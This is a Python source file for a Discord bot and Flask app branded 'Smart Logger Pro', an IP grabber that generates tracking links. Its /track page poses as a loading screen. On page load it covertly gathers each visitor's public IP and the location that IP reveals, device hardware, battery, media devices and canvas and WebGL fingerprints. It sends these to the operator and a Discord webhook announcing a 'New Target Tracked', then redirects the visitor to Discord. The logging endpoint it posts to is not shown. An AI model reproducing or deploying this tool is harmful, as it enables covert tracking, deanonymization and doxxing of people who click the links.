import discord
from discord.ext import commands
import requests
import json
from datetime import datetime
import string
import random
from flask import Flask, request, redirect, jsonify, render_template_string
from threading import Thread
import os
from user_agents import parse
import hashlib
import base64
import socket
import struct

# Create bot with command prefix
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Store generated links and their tracking data
tracking_links = {}
webhooks = {}
flask_app = Flask(__name__)

def generate_short_code(length=6):
    """Generate a random short code for links"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def parse_user_agent(ua_string):
    """Parse user agent string for detailed info"""
    try:
        ua = parse(ua_string)
        return {
            'browser': str(ua.browser.family),
            'browser_version': str(ua.browser.version_string),
            'os': str(ua.os.family),
            'os_version': str(ua.os.version_string),
            'device': str(ua.device.family),
            'is_mobile': ua.is_mobile,
            'is_tablet': ua.is_tablet,
            'is_pc': ua.is_pc,
            'is_bot': ua.is_bot
        }
    except:
        return None

def get_detailed_ip_info(ip_address):
    """Get detailed IP information"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}?fields=continent,continentCode,country,countryCode,region,regionName,city,district,zip,timezone,org,isp,reverse,lat,lon,offset,currency,proxy,hosting,mobile')
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def send_advanced_webhook(webhook_url, data, link_name):
    """Send advanced tracking data to Discord webhook with embeds"""
    try:
        ua_data = parse_user_agent(data.get('userAgent', ''))
        ip_info = get_detailed_ip_info(data.get('ip', ''))
        
        embeds = []
        
        # Main Info Embed
        main_embed = {
            "title": "🎯 New Target Tracked",
            "color": 16711680,
            "fields": [
                {"name": "Link Name", "value": link_name or "Untitled", "inline": True},
                {"name": "Timestamp", "value": data.get('timestamp', 'Unknown'), "inline": True},
                {"name": "IP Address", "value": f"`{data.get('ip', 'Unknown')}`", "inline": True},
                {"name": "Server Detected IP", "value": f"`{data.get('server_detected_ip', 'Unknown')}`", "inline": True},
            ],
            "thumbnail": {"url": "https://img.icons8.com/color/96/000000/ip-address.png"}
        }
        embeds.append(main_embed)
        
        # Location Embed
        if ip_info:
            location_embed = {
                "title": "📍 Geolocation",
                "color": 3447003,
                "fields": [
                    {"name": "Country", "value": f"{ip_info.get('country', 'N/A')} ({ip_info.get('countryCode', 'N/A')})", "inline": True},
                    {"name": "Region", "value": f"{ip_info.get('regionName', 'N/A')} ({ip_info.get('region', 'N/A')})", "inline": True},
                    {"name": "City", "value": ip_info.get('city', 'N/A'), "inline": True},
                    {"name": "ISP", "value": ip_info.get('isp', 'N/A'), "inline": True},
                    {"name": "Organization", "value": ip_info.get('org', 'N/A'), "inline": True},
                    {"name": "Postal Code", "value": ip_info.get('zip', 'N/A'), "inline": True},
                    {"name": "Coordinates", "value": f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}", "inline": False},
                    {"name": "VPN/Proxy", "value": "⚠️ YES" if ip_info.get('proxy') else "No", "inline": True},
                    {"name": "Hosting", "value": "⚠️ YES" if ip_info.get('hosting') else "No", "inline": True},
                    {"name": "Mobile", "value": "📱 YES" if ip_info.get('mobile') else "No", "inline": True},
                ]
            }
            embeds.append(location_embed)
        
        # Browser & OS Embed
        if ua_data:
            browser_embed = {
                "title": "💻 Browser & System",
                "color": 10181046,
                "fields": [
                    {"name": "Browser", "value": f"{ua_data['browser']} {ua_data['browser_version']}", "inline": True},
                    {"name": "OS", "value": f"{ua_data['os']} {ua_data['os_version']}", "inline": True},
                    {"name": "Device", "value": ua_data['device'], "inline": True},
                    {"name": "Device Type", "value": f"Mobile: {ua_data['is_mobile']}, Tablet: {ua_data['is_tablet']}, PC: {ua_data['is_pc']}", "inline": False},
                    {"name": "Bot", "value": "🤖 YES" if ua_data['is_bot'] else "No", "inline": True},
                ]
            }
            embeds.append(browser_embed)
        
        # Hardware Embed
        hardware_embed = {
            "title": "⚙️ Hardware & Device",
            "color": 12745742,
            "fields": [
                {"name": "CPU Cores", "value": str(data.get('hardwareConcurrency', 'Unknown')), "inline": True},
                {"name": "RAM", "value": f"{data.get('deviceMemory', 'Unknown')} GB", "inline": True},
                {"name": "Touch Points", "value": str(data.get('maxTouchPoints', 0)), "inline": True},
                {"name": "Touch Enabled", "value": "✓ Yes" if data.get('touchEnabled') else "No", "inline": True},
                {"name": "Pointer Events", "value": "✓ Yes" if data.get('pointerEnabled') else "No", "inline": True},
                {"name": "Display", "value": f"{data.get('screenWidth', 'N/A')}x{data.get('screenHeight', 'N/A')} @ {data.get('devicePixelRatio', 'N/A')}x DPI", "inline": False},
                {"name": "Color Depth", "value": f"{data.get('screenColorDepth', 'N/A')} bits", "inline": True},
                {"name": "Pixel Depth", "value": f"{data.get('screenPixelDepth', 'N/A')} bits", "inline": True},
            ]
        }
        embeds.append(hardware_embed)
        
        # Network Embed
        network_embed = {
            "title": "🌐 Network & Connection",
            "color": 1146986,
            "fields": [
                {"name": "Connection Type", "value": data.get('effectiveType', 'Unknown'), "inline": True},
                {"name": "Downlink", "value": f"{data.get('downlink', 'Unknown')} Mbps", "inline": True},
                {"name": "RTT", "value": f"{data.get('rtt', 'Unknown')} ms", "inline": True},
                {"name": "Online", "value": "✓ Yes" if data.get('onLine') else "No", "inline": True},
                {"name": "Save Data", "value": "Yes" if data.get('saveData') else "No", "inline": True},
            ]
        }
        embeds.append(network_embed)
        
        # Battery & Media
        battery_media_embed = {
            "title": "🔋 Battery & Media",
            "color": 15158332,
            "fields": [
                {"name": "Battery Level", "value": data.get('batteryLevel', 'Unknown'), "inline": True},
                {"name": "Charging", "value": data.get('batteryCharging', 'Unknown'), "inline": True},
                {"name": "Media Devices", "value": data.get('mediaDevices', 'Unknown'), "inline": False},
                {"name": "Plugins Count", "value": str(data.get('pluginsCount', 0)), "inline": True},
            ]
        }
        embeds.append(battery_media_embed)
        
        # Capabilities Embed
        capabilities_embed = {
            "title": "🛠️ Browser Capabilities",
            "color": 9442302,
            "fields": [
                {"name": "WebGL", "value": "✓ Supported" if data.get('webGLSupported') else "Not supported", "inline": True},
                {"name": "WebGL 2.0", "value": "✓ Yes" if data.get('webGL2_enabled') else "No", "inline": True},
                {"name": "WebRTC", "value": "✓ Yes" if data.get('webRTC_enabled') else "No", "inline": True},
                {"name": "Service Workers", "value": "✓ Yes" if data.get('serviceWorkers_enabled') else "No", "inline": True},
                {"name": "Web Workers", "value": "✓ Yes" if data.get('webWorkers_enabled') else "No", "inline": True},
                {"name": "IndexedDB", "value": "✓ Yes" if data.get('indexedDB_enabled') else "No", "inline": True},
                {"name": "Crypto.subtle", "value": "✓ Yes" if data.get('cryptoSubtle_enabled') else "No", "inline": True},
                {"name": "Canvas Blocked", "value": "⚠️ YES" if data.get('canvas_blocked') else "No", "inline": True},
                {"name": "LocalStorage", "value": "✓ Enabled" if data.get('localStorageEnabled') else "Disabled", "inline": True},
                {"name": "SessionStorage", "value": "✓ Enabled" if data.get('sessionStorageEnabled') else "Disabled", "inline": True},
            ]
        }
        embeds.append(capabilities_embed)
        
        # Privacy & Security Embed
        privacy_embed = {
            "title": "🔒 Privacy & Security",
            "color": 15105570,
            "fields": [
                {"name": "Cookies", "value": "✓ Enabled" if data.get('cookiesEnabled') else "Disabled", "inline": True},
                {"name": "Do Not Track", "value": data.get('doNotTrack', 'Not set'), "inline": True},
                {"name": "Vendor", "value": data.get('vendor', 'Unknown'), "inline": True},
                {"name": "Platform", "value": data.get('platform', 'Unknown'), "inline": True},
                {"name": "Language", "value": data.get('language', 'Unknown'), "inline": True},
                {"name": "Timezone", "value": data.get('timezone', 'Unknown'), "inline": True},
                {"name": "Referrer", "value": data.get('referrer', 'Direct')[:100], "inline": False},
            ]
        }
        embeds.append(privacy_embed)
        
        # Canvas & WebGL Embed
        canvas_webgl_embed = {
            "title": "🎨 Canvas & GPU",
            "color": 16776960,
            "fields": [
                {"name": "Canvas Fingerprint", "value": data.get('canvasFingerprint', 'N/A')[:150], "inline": False},
                {"name": "WebGL Vendor", "value": data.get('webglVendor', 'Unknown'), "inline": True},
                {"name": "WebGL Renderer", "value": data.get('webglRenderer', 'Unknown')[:100], "inline": False},
            ]
        }
        embeds.append(canvas_webgl_embed)
        
        payload = {"embeds": embeds}
        requests.post(webhook_url, json=payload, timeout=10)
    except Exception as e:
        print(f"Webhook send error: {e}")

@flask_app.route('/')
def dashboard():
    """Main dashboard page"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔍 Smart Logger - Professional Tracker</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                min-height: 100vh;
                padding: 20px;
                color: #eee;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
            }
            .header {
                text-align: center;
                margin-bottom: 40px;
            }
            .header h1 {
                font-size: 3em;
                color: #00d4ff;
                text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
                margin-bottom: 10px;
            }
            .header p {
                font-size: 1.1em;
                color: #aaa;
            }
            .cards {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .card {
                background: linear-gradient(135deg, #16213e 0%, #0f3460 100%);
                border-radius: 15px;
                padding: 30px;
                border: 2px solid #00d4ff;
                box-shadow: 0 10px 40px rgba(0, 212, 255, 0.2);
                transition: all 0.3s;
            }
            .card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 60px rgba(0, 212, 255, 0.3);
                border-color: #00ffff;
            }
            .card h2 {
                color: #00d4ff;
                margin-bottom: 15px;
                font-size: 1.5em;
            }
            input, textarea {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: 2px solid #00d4ff;
                border-radius: 8px;
                font-size: 1em;
                background: rgba(15, 52, 96, 0.5);
                color: #eee;
                font-family: Arial, sans-serif;
                transition: all 0.3s;
            }
            input:focus, textarea:focus {
                outline: none;
                border-color: #00ffff;
                background: rgba(15, 52, 96, 0.8);
                box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
            }
            button {
                width: 100%;
                padding: 12px;
                margin-top: 15px;
                background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
                color: #000;
                border: none;
                border-radius: 8px;
                font-size: 1em;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s;
            }
            button:hover {
                box-shadow: 0 0 20px rgba(0, 212, 255, 0.6);
                transform: scale(1.02);
            }
            button:active {
                transform: scale(0.98);
            }
            .result {
                background: rgba(0, 212, 255, 0.1);
                padding: 15px;
                border-radius: 8px;
                margin-top: 15px;
                word-break: break-all;
                border-left: 4px solid #00d4ff;
            }
            .copy-btn {
                width: auto;
                padding: 8px 15px;
                margin: 5px 5px 5px 0;
                font-size: 0.9em;
                display: inline-block;
            }
            .status {
                margin-top: 10px;
                padding: 10px;
                border-radius: 5px;
                text-align: center;
                font-weight: bold;
            }
            .status.success {
                background: rgba(0, 200, 100, 0.3);
                color: #00ff88;
                border: 1px solid #00ff88;
            }
            .status.error {
                background: rgba(255, 0, 0, 0.3);
                color: #ff4444;
                border: 1px solid #ff4444;
            }
            .info-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 10px;
                margin-top: 15px;
            }
            .info-item {
                background: rgba(0, 212, 255, 0.1);
                padding: 10px;
                border-radius: 5px;
                border-left: 3px solid #00d4ff;
            }
            .info-item strong {
                color: #00ffff;
            }
            .emoji {
                margin-right: 8px;
                font-size: 1.2em;
            }
            code {
                background: rgba(0, 0, 0, 0.5);
                padding: 2px 6px;
                border-radius: 3px;
                color: #00ffff;
            }
            .section-title {
                color: #00d4ff;
                margin-top: 30px;
                margin-bottom: 15px;
                font-size: 1.8em;
                text-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔍 Smart Logger Pro</h1>
                <p>Advanced IP Tracking & Device Fingerprinting</p>
            </div>
            
            <div class="section-title">📎 Link Management</div>
            <div class="cards">
                <div class="card">
                    <h2><span class="emoji">🔗</span>Generate Tracker</h2>
                    <p>Create professional tracking link</p>
                    <input type="text" id="linkName" placeholder="Link name (optional)">
                    <input type="text" id="linkDescription" placeholder="Description (optional)">
                    <button onclick="generateLink()">Generate Tracking Link</button>
                    <div id="linkResult"></div>
                </div>
                
                <div class="card">
                    <h2><span class="emoji">📊</span>My Links</h2>
                    <p>View all generated trackers</p>
                    <button onclick="viewLinks()">Refresh Links List</button>
                    <div id="linksResult"></div>
                </div>
            </div>
            
            <div class="section-title">🪝 Webhook & Notifications</div>
            <div class="cards">
                <div class="card">
                    <h2><span class="emoji">🪝</span>Discord Webhook</h2>
                    <p>Live notifications for each track</p>
                    <input type="text" id="webhookCode" placeholder="Link code">
                    <textarea id="webhookUrl" placeholder="Discord Webhook URL" rows="4"></textarea>
                    <button onclick="setupWebhook()">Connect Webhook</button>
                    <div id="webhookResult"></div>
                </div>
                
                <div class="card">
                    <h2><span class="emoji">📧</span>Email Alerts</h2>
                    <p>Get email notifications (Coming Soon)</p>
                    <input type="email" placeholder="Your email">
                    <textarea placeholder="Custom message" rows="3"></textarea>
                    <button disabled>Coming Soon</button>
                </div>
            </div>
            
            <div class="section-title">⚙️ Utilities</div>
            <div class="cards">
                <div class="card">
                    <h2><span class="emoji">⚙️</span>System Scanner</h2>
                    <p>Analyze your device fingerprint</p>
                    <button onclick="showSystemInfo()">Scan My System</button>
                    <div id="systemResult"></div>
                </div>
                
                <div class="card">
                    <h2><span class="emoji">📱</span>Device Info</h2>
                    <p>Detailed hardware information</p>
                    <button onclick="showDetailedInfo()">Show Detailed Info</button>
                    <div id="detailedResult"></div>
                </div>
            </div>
        </div>
        
        <script>
            async function generateLink() {
                const name = document.getElementById('linkName').value || 'Untitled';
                const description = document.getElementById('linkDescription').value || '';
                try {
                    const response = await fetch('/api/genlink', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({name: name, description: description})
                    });
                    const data = await response.json();
                    if (data.success) {
                        document.getElementById('linkResult').innerHTML = `
                            <div class="status success">✓ Link generated!</div>
                            <div class="result">
                                <strong>Code:</strong> ${data.code}<br>
                                <strong>Name:</strong> ${data.name}<br>
                                <strong>Created:</strong> ${data.created_at}<br><br>
                                <button class="copy-btn" onclick="copyToClipboard('${data.code}')">📋 Copy Code</button>
                                <button class="copy-btn" onclick="copyToClipboard('${data.tracking_url}')">🔗 Copy URL</button>
                            </div>
                        `;
                        document.getElementById('linkName').value = '';
                        document.getElementById('linkDescription').value = '';
                    }
                } catch(e) {
                    document.getElementById('linkResult').innerHTML = '<div class="status error">Error generating link</div>';
                }
            }
            
            async function viewLinks() {
                try {
                    const response = await fetch('/api/getlinks');
                    const data = await response.json();
                    if (data.links && data.links.length > 0) {
                        let html = '<div>';
                        data.links.forEach(link => {
                            html += `
                                <div class="info-item" style="margin-bottom: 10px;">
                                    <strong>${link.name}</strong><br>
                                    <code>${link.code}</code><br>
                                    Clicks: <strong>${link.clicks}</strong><br>
                                    <button class="copy-btn" onclick="copyToClipboard('${link.code}')">Copy Code</button>
                                </div>
                            `;
                        });
                        html += '</div>';
                        document.getElementById('linksResult').innerHTML = html;
                    } else {
                        document.getElementById('linksResult').innerHTML = '<div class="status error">No links yet</div>';
                    }
                } catch(e) {
                    document.getElementById('linksResult').innerHTML = '<div class="status error">Error loading links</div>';
                }
            }
            
            async function setupWebhook() {
                const code = document.getElementById('webhookCode').value;
                const url = document.getElementById('webhookUrl').value;
                if (!code || !url) {
                    document.getElementById('webhookResult').innerHTML = '<div class="status error">Fill in all fields</div>';
                    return;
                }
                try {
                    const response = await fetch('/api/webhook', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({code: code, webhook_url: url})
                    });
                    const data = await response.json();
                    if (data.success) {
                        document.getElementById('webhookResult').innerHTML = '<div class="status success">✓ Webhook connected!</div>';
                        document.getElementById('webhookCode').value = '';
                        document.getElementById('webhookUrl').value = '';
                    } else {
                        document.getElementById('webhookResult').innerHTML = '<div class="status error">Error: ' + data.error + '</div>';
                    }
                } catch(e) {
                    document.getElementById('webhookResult').innerHTML = '<div class="status error">Error setting up webhook</div>';
                }
            }
            
            function showSystemInfo() {
                const info = `
                    <div class="info-grid">
                        <div class="info-item"><strong>Browser:</strong> ${navigator.userAgent.substring(0, 50)}...</div>
                        <div class="info-item"><strong>Platform:</strong> ${navigator.platform}</div>
                        <div class="info-item"><strong>Language:</strong> ${navigator.language}</div>
                        <div class="info-item"><strong>Cookies:</strong> ${navigator.cookieEnabled ? '✓ Yes' : 'No'}</div>
                        <div class="info-item"><strong>Online:</strong> ${navigator.onLine ? '✓ Yes' : 'No'}</div>
                        <div class="info-item"><strong>Screen:</strong> ${window.screen.width}x${window.screen.height}</div>
                        <div class="info-item"><strong>CPU Cores:</strong> ${navigator.hardwareConcurrency || 'Unknown'}</div>
                        <div class="info-item"><strong>RAM:</strong> ${navigator.deviceMemory || 'Unknown'} GB</div>
                    </div>
                `;
                document.getElementById('systemResult').innerHTML = info;
            }
            
            function showDetailedInfo() {
                const info = `
                    <div class="info-grid">
                        <div class="info-item"><strong>Timezone:</strong> ${Intl.DateTimeFormat().resolvedOptions().timeZone}</div>
                        <div class="info-item"><strong>Languages:</strong> ${navigator.languages ? navigator.languages.join(', ') : navigator.language}</div>
                        <div class="info-item"><strong>WebGL:</strong> ${!!(document.createElement('canvas').getContext('webgl')) ? '✓ Yes' : 'No'}</div>
                        <div class="info-item"><strong>WebRTC:</strong> ${!!window.RTCPeerConnection ? '✓ Yes' : 'No'}</div>
                        <div class="info-item"><strong>Service Workers:</strong> ${'serviceWorker' in navigator ? '✓ Yes' : 'No'}</div>
                        <div class="info-item"><strong>IndexedDB:</strong> ${!!window.indexedDB ? '✓ Yes' : 'No'}</div>
                        <div class="info-item"><strong>LocalStorage:</strong> ${typeof(Storage) !== 'undefined' ? '✓ Yes' : 'No'}</div>
                        <div class="info-item"><strong>WebWorkers:</strong> ${typeof(Worker) !== 'undefined' ? '✓ Yes' : 'No'}</div>
                    </div>
                `;
                document.getElementById('detailedResult').innerHTML = info;
            }
            
            function copyToClipboard(text) {
                navigator.clipboard.writeText(text).then(() => {
                    alert('✓ Copied to clipboard!');
                });
            }
        </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@flask_app.route('/api/genlink', methods=['POST'])
def api_genlink():
    """API endpoint to generate link"""
    try:
        data = request.json
        code = generate_short_code()
        tracking_url = f"https://{request.host}/track?code={code}"
        
        tracking_links[code] = {
            'name': data.get('name', 'Untitled'),
            'description': data.get('description', ''),
            'created_at': datetime.now().isoformat(),
            'clicks': [],
            'webhook': None
        }
        return jsonify({
            'success': True,
            'code': code,
            'name': data.get('name', 'Untitled'),
            'tracking_url': tracking_url,
            'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@flask_app.route('/api/getlinks', methods=['GET'])
def api_getlinks():
    """API endpoint to get all links"""
    links_list = []
    for code, data in tracking_links.items():
        links_list.append({
            'code': code,
            'name': data.get('name', 'Untitled'),
            'description': data.get('description', ''),
            'clicks': len(data.get('clicks', []))
        })
    return jsonify({'links': links_list})

@flask_app.route('/api/webhook', methods=['POST'])
def api_webhook():
    """API endpoint to setup webhook"""
    try:
        data = request.json
        code = data.get('code')
        webhook_url = data.get('webhook_url')
        
        if code not in tracking_links:
            return jsonify({'success': False, 'error': 'Link code not found'})
        
        if not webhook_url.startswith('https://discord.com/api/webhooks/'):
            return jsonify({'success': False, 'error': 'Invalid Discord webhook URL'})
        
        tracking_links[code]['webhook'] = webhook_url
        webhooks[code] = webhook_url
        
        return jsonify({'success': True, 'message': 'Webhook connected'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@flask_app.route('/track')
def track_page():
    """Serve tracking page - Grabify/Canarytokens style"""
    code = request.args.get('code')
    if not code or code not in tracking_links:
        return "Invalid tracking code", 404
    
    # Get referer and other request headers for advanced tracking
    client_ip = request.remote_addr
    if request.headers.getlist('X-Forwarded-For'):
        client_ip = request.headers.getlist('X-Forwarded-For')[0]
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                font-family: Arial, sans-serif;
                color: white;
            }}
            .container {{
                text-align: center;
            }}
            .spinner {{
                border: 4px solid rgba(255,255,255,0.3);
                border-top: 4px solid white;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }}
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="spinner"></div>
            <p>Loading content...</p>
        </div>
        <script>
            // Advanced tracking similar to Grabify & Canarytokens
            const data = {{
                code: '{code}',
                ip: '',
                server_detected_ip: '{client_ip}',
                
                // HTTP Headers
                user_agent: navigator.userAgent,
                referrer: document.referrer || 'Direct',
                
                // Advanced Browser Data
                appCodeName: navigator.appCodeName,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages ? Array.from(navigator.languages) : [navigator.language],
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                cookieEnabled: navigator.cookieEnabled,
                
                // Screen & Display
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                screenAvailWidth: window.screen.availWidth,
                screenAvailHeight: window.screen.availHeight,
                screenColorDepth: window.screen.colorDepth,
                screenPixelDepth: window.screen.pixelDepth,
                devicePixelRatio: window.devicePixelRatio,
                windowInnerWidth: window.innerWidth,
                windowInnerHeight: window.innerHeight,
                windowOuterWidth: window.outerWidth,
                windowOuterHeight: window.outerHeight,
                screenOrientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown',
                
                // Device Hardware
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                pointerEnabled: typeof PointerEvent !== 'undefined',
                touchEnabled: 'ontouchstart' in window,
                
                // Storage
                localStorageEnabled: (() => {{
                    try {{ localStorage.setItem('t', 't'); localStorage.removeItem('t'); return true; }} 
                    catch(e) {{ return false; }}
                }})(),
                sessionStorageEnabled: (() => {{
                    try {{ sessionStorage.setItem('t', 't'); sessionStorage.removeItem('t'); return true; }} 
                    catch(e) {{ return false; }}
                }})(),
                indexedDBEnabled: !!window.indexedDB,
                
                // Location & Time
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // Plugins & Extensions
                pluginsCount: navigator.plugins.length,
                plugins: Array.from(navigator.plugins).map(p => p.name).join('; ') || 'None',
                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join('; ') || 'None',
                
                // Browser Capabilities
                webGLSupported: false,
                webGL2Supported: false,
                webglVendor: '',
                webglRenderer: '',
                canvasBlocked: false,
                canvasFingerprint: '',
                webRTCEnabled: !!window.RTCPeerConnection,
                serviceWorkerSupported: 'serviceWorker' in navigator,
                webWorkersSupported: typeof(Worker) !== 'undefined',
                sharedArrayBufferSupported: typeof SharedArrayBuffer !== 'undefined',
                cryptoSubtleSupported: !!(window.crypto && window.crypto.subtle),
                
                // Battery & Media
                batteryLevel: 'Unknown',
                batteryCharging: 'Unknown',
                mediaDevices: '',
                audioContextState: '',
                
                // Network
                connectionType: 'Unknown',
                effectiveType: 'Unknown',
                downlink: 'Unknown',
                rtt: 'Unknown',
                saveData: navigator.saveData || false,
                
                // Document Info
                documentTitle: document.title,
                documentURL: window.location.href,
                characterEncoding: document.characterSet,
                doctype: document.doctype ? document.doctype.name : 'Unknown',
                
                // Timestamp
                timestamp: new Date().toISOString(),
                timestamp_unix: Date.now(),
                pageLoadTime: 0
            }};
            
            const startTime = performance.now();
            
            // WebGL Detection
            try {{
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {{
                    data.webGLSupported = true;
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {{
                        data.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        data.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }}
                }}
                const gl2 = canvas.getContext('webgl2');
                data.webGL2Supported = !!gl2;
            }} catch(e) {{}}
            
            // Canvas Fingerprinting
            try {{
                const canvas = document.createElement('canvas');
                canvas.width = 280;
                canvas.height = 60;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('SmartLogger:' + Math.random(), 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('ID:' + Date.now(), 2, 30);
                data.canvasFingerprint = canvas.toDataURL().substring(0, 150);
            }} catch(e) {{
                data.canvasBlocked = true;
            }}
            
            // Network Info
            if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {{
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                data.connectionType = conn.type || conn.effectiveType;
                data.effectiveType = conn.effectiveType || 'Unknown';
                data.downlink = conn.downlink || 'Unknown';
                data.rtt = conn.rtt || 'Unknown';
            }}
            
            // Battery Info
            if (navigator.getBattery) {{
                navigator.getBattery().then(battery => {{
                    data.batteryLevel = (battery.level * 100).toFixed(2) + '%';
                    data.batteryCharging = battery.charging ? 'Yes' : 'No';
                }});
            }}
            
            // Media Devices
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
                navigator.mediaDevices.enumerateDevices().then(devices => {{
                    const audioIn = devices.filter(d => d.kind === 'audioinput').length;
                    const videoIn = devices.filter(d => d.kind === 'videoinput').length;
                    const audioOut = devices.filter(d => d.kind === 'audiooutput').length;
                    data.mediaDevices = audioIn + ' audio in, ' + videoIn + ' video in, ' + audioOut + ' audio out';
                }});
            }}
            
            // Get Public IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {{
                    data.ip = ipData.ip;
                    data.pageLoadTime = (performance.now() - startTime).toFixed(2) + 'ms';
                    return fetch('/api/log', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify(data)
                    }});
                }})
                .then(() => {{
                    setTimeout(() => {{
                        window.location.href = 'https://discord.gg/';
                    }}, 800);
                }})
                .catch(e => {{
                    setTimeout(() => {{
                        window.location.href = 'https://discord.gg/';
                    }}, 2000);
                }});
        </script>
    </body>
    </html>
    '''
    return html
